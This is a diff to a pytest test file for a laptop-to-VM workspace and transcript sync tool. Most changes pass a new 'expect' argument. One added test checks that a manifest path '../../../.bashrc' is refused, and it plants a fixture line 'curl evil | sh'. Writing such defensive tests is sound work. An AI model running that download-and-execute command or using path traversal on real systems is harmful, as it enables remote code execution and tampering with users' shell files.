@@ -208,7 +208,8 @@ def test_export_of_a_never_prompted_session_pulls_only_the_workspace(tmp_path):
     assert m["record_count"] == 0
     manifest = bundle.extract(out, tmp_path / "x")
 
-    result = apply.apply_export(tmp_path / "x", manifest, home=laptop_home)
+    result = apply.apply_export(tmp_path / "x", manifest, home=laptop_home,
+                                expect=apply.transfer_copy({"session_id": sid, "cwd": str(laptop_repo)}))
     assert result["transcript"] is None and result["session_id"] == sid
     assert (laptop_repo / "app.py").read_text() == "print('edited on the vm')\n"
     assert not (laptop_home / "projects").exists()
@@ -256,7 +257,8 @@ def test_pull_into_a_plain_folder_replaces_only_files_unchanged_since_the_push(t
     (folder / ".DS_Store").write_text("finder junk\n")  # appeared locally, the cloud copy has no such file
 
     apply.check_before_export(pushed, home=home)
-    result = apply.apply_export(tmp_path / "x", export(), home=home, pushed_files=pushed["workspace"]["files"])
+    result = apply.apply_export(tmp_path / "x", export(), home=home, expect=apply.pushed_copy(pushed),
+                                pushed_files=pushed["workspace"]["files"])
 
     assert (folder / "plan.txt").read_text() == "v2 from the vm\n"
     assert (folder / "new.txt").read_text() == "made on the vm\n"
@@ -276,11 +278,12 @@ def test_pull_into_a_plain_folder_refuses_a_new_local_file_the_cloud_copy_also_m
     apply.check_before_export(pushed, home=home)
     manifest = export()
     with pytest.raises(apply.ApplyError, match=r"changed here since the push.*: draft\.txt\. .*--force"):
-        apply.apply_export(tmp_path / "x", manifest, home=home, pushed_files=pushed["workspace"]["files"])
+        apply.apply_export(tmp_path / "x", manifest, home=home, expect=apply.pushed_copy(pushed),
+                           pushed_files=pushed["workspace"]["files"])
     assert (folder / "draft.txt").read_text() == "my draft\n"
     assert (folder / "plan.txt").read_text() == "v1\n"
 
-    result = apply.apply_export(tmp_path / "x", manifest, home=home, force=True,
+    result = apply.apply_export(tmp_path / "x", manifest, home=home, expect=apply.pushed_copy(pushed), force=True,
                                 pushed_files=pushed["workspace"]["files"])
     assert result["overwritten"] == ["draft.txt"]
     assert (folder / "draft.txt").read_text() == "vm draft\n"
@@ -293,7 +296,8 @@ def test_pull_into_a_plain_folder_pushed_from_elsewhere_refuses_any_local_differ
     folder, home, pushed, vm_folder, export = _plain_folder_round(tmp_path)
     (vm_folder / "plan.txt").write_text("v2 from the vm\n")
     with pytest.raises(apply.ApplyError, match=r"plan\.txt"):
-        apply.apply_export(tmp_path / "x", export(), home=home)
+        apply.apply_export(tmp_path / "x", export(), home=home,
+                           expect=apply.transfer_copy({"session_id": pushed["session_id"], "cwd": str(folder)}))
     assert (folder / "plan.txt").read_text() == "v1\n"
 
 
@@ -307,8 +311,26 @@ def test_pull_into_a_plain_folder_refuses_local_edits_before_the_export(tmp_path
 
     # The VM left plan.txt alone: the cloud copy is still the pushed version, and the local edit is still newer.
     with pytest.raises(apply.ApplyError, match=r"plan\.txt"):
-        apply.apply_export(tmp_path / "x", export(), home=home, pushed_files=pushed["workspace"]["files"])
+        apply.apply_export(tmp_path / "x", export(), home=home, expect=apply.pushed_copy(pushed),
+                           pushed_files=pushed["workspace"]["files"])
     assert (folder / "plan.txt").read_text() == "edited here after the push\n"
+
+
+def test_pull_refuses_a_cloud_copy_naming_a_transcript_outside_its_project(tmp_path):
+    """The VM writes the manifest: an extra transcript named with a path would be copied wherever it points."""
+    folder, home, pushed, vm_folder, export = _plain_folder_round(tmp_path)
+    vm_proj = tmp_path / "vm" / ".claude" / "projects" / pushed["project_dir"]
+    vm_proj.mkdir(parents=True)
+    (vm_proj / f"{pushed['session_id']}.jsonl").write_text("")
+    manifest = export()
+    manifest["extra_transcripts"] = ["../../../.bashrc"]
+    (tmp_path / "x" / ".bashrc").write_text("curl evil | sh\n")
+
+    with pytest.raises(apply.ApplyError, match="transcript outside its project"):
+        apply.apply_export(tmp_path / "x", manifest, home=home, expect=apply.pushed_copy(pushed),
+                           pushed_files=pushed["workspace"]["files"])
+    assert not (home.parent / ".bashrc").exists()
+    assert not (home / "projects").exists()
 
 
 def test_push_of_a_plain_folder_with_a_fifo_and_a_socket(tmp_path):
@@ -348,9 +370,10 @@ def test_pull_into_a_plain_folder_backs_up_an_edited_hard_link(tmp_path):
     (folder / "edit.tmp").write_text("edited here\n")
     os.replace(folder / "edit.tmp", folder / link)
     with pytest.raises(apply.ApplyError, match=rf": {link}\."):
-        apply.apply_export(tmp_path / "x", manifest, home=home, pushed_files=pushed["workspace"]["files"])
+        apply.apply_export(tmp_path / "x", manifest, home=home, expect=apply.pushed_copy(pushed),
+                           pushed_files=pushed["workspace"]["files"])
 
-    result = apply.apply_export(tmp_path / "x", manifest, home=home, force=True,
+    result = apply.apply_export(tmp_path / "x", manifest, home=home, expect=apply.pushed_copy(pushed), force=True,
                                 pushed_files=pushed["workspace"]["files"])
     assert result["overwritten"] == [link]
     assert (Path(result["backup"]) / "workspace" / link).read_text() == "edited here\n"
